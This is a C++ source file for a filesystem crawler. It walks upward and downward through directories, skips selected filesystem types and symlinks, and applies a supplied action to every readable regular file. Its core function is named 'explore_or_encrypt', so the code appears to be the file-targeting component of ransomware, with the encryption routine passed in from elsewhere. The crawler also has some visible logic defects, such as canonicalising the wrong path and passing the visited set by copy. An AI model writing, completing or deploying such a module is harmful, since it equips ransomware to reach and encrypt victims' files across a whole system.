#include <vector>
#include <functional>
#include <iostream>
#include <sys/vfs.h>
#include <set>
#include <filesystem>

int get_filesystem_type(const std::string& mount_point)
{
    struct statfs buffer;
    if (statfs(mount_point.c_str(), &buffer) == 0)
    {
        return buffer.f_type;
    }
    else
    {
        perror(("statfs failed: " + mount_point).c_str());
        return -1;
    }
}

std::set<int> get_unwanted_fs_types(const std::vector<std::string>& paths)
{
    std::set<int> fs_types;
    for (const auto& path : paths)
    {
        int fs_type = get_filesystem_type(path);
        if (fs_type != -1)
        {
            fs_types.insert(fs_type);
        }
    }
    return fs_types;
}

bool is_unwanted_fs(const std::filesystem::path& path, const std::set<int>& fs_types)
{
    
    int fs_type = get_filesystem_type(path);
    if (fs_type == -1)
    {
        return  false;
    }
    bool result = (fs_types.find(fs_type) != fs_types.end());
    return result;
}

bool has_permission(const std::filesystem::path& path)
{
    try {
        auto perms = std::filesystem::status(path).permissions();
        return (perms & std::filesystem::perms::owner_read) != std::filesystem::perms::none;
    } catch (const std::filesystem::filesystem_error& e) {
        std::cerr << "Permission check failed for " << path << ": " << e.what() << "\n";
    }
    return false;
}



std::filesystem::path safe_canonical(const std::filesystem::path& path)
{
    if (std::filesystem::exists(path)) {
        try {
            return std::filesystem::canonical(path);
        } catch (const std::filesystem::filesystem_error& e) {
            std::cerr << "Error: " << e.what() << "\n";
        }
    } else {
        std::cerr << "Path does not exist: " << path << "\n";
    }
    return std::filesystem::path();
}

bool is_valid(const std::set<std::filesystem::path>& visited, const std::filesystem::path& path)
{
    auto canonical_path = safe_canonical(path);
    bool result = (visited.find(canonical_path) == visited.end());
    return result;
}

void explore_neighbour(std::vector<std::filesystem::path>& stack, const std::set<std::filesystem::path>& visited, const std::filesystem::path& path)
{
    auto parent_dir = path.parent_path();
    if (!parent_dir.empty() && is_valid(visited, parent_dir) && has_permission(parent_dir))
    {
        stack.push_back(parent_dir); 
    }
    for (const auto& dir_entry : std::filesystem::directory_iterator{path})
    {
        auto canonical_dir_entry = safe_canonical(path);
        if (has_permission(dir_entry) && is_valid(visited, canonical_dir_entry))
        {
            stack.push_back(dir_entry.path());
        }
    }
}

int push_entries(std::vector<std::filesystem::path>& stack, std::set<std::filesystem::path>& visited, std::filesystem::path path)
{
    if (std::filesystem::is_directory(path) && !std::filesystem::is_symlink(path))
    {
        explore_neighbour(stack, visited, path);
        return EXIT_SUCCESS;
    }
    return EXIT_FAILURE;
}

int ft_file(std::vector<std::filesystem::path>& stack, std::set<std::filesystem::path>& visited, const std::filesystem::path& path, std::function<int(const char*)> action)
{
    if (std::filesystem::is_regular_file(path) && !std::filesystem::is_symlink(path))
    {
        std::cout << "\n\nworking on fct ptr:" << std::endl; 
        action(path.string().c_str());
        return EXIT_SUCCESS;
    }
    return EXIT_FAILURE;
}

bool explore_or_encrypt(std::vector<std::filesystem::path>& stack, std::set<std::filesystem::path> visited, const std::filesystem::path& path, std::function<int(const char*)> action)
{
    auto canonical_path = safe_canonical(path);
    if (!is_valid(visited, canonical_path))
    {
        return EXIT_FAILURE;
    }
    if (!push_entries(stack, visited, canonical_path))
    {
        return EXIT_SUCCESS;
    }
    else
    {
        ft_file(stack, visited, canonical_path, action);
    }
    return EXIT_SUCCESS;
}

// Explore the neighbors of the current directory
int crawler(std::filesystem::path start_path, std::function<int(const char*)> action, const std::vector<std::string>& unwanted_mount_points)
{
    std::set<int> fs_types = get_unwanted_fs_types(unwanted_mount_points);
    std::vector<std::filesystem::path> stack;
    std::set<std::filesystem::path> visited;
    auto canonical_path = safe_canonical(start_path);
    stack.push_back(start_path);
    while (!stack.empty())
    {
        std::filesystem::path path = stack.back();
        stack.pop_back();
        if (path.empty() || is_unwanted_fs(path, fs_types))
        {
            continue;
        }
        try
        {
            explore_or_encrypt(stack, visited, path, action);
            visited.insert(path);
        } catch (const std::filesystem::filesystem_error& e)
        {
                std::cerr << "Error processing path " << path << ": " << e.what() << "\n";
                continue;
        }
    }
    return EXIT_SUCCESS;
}

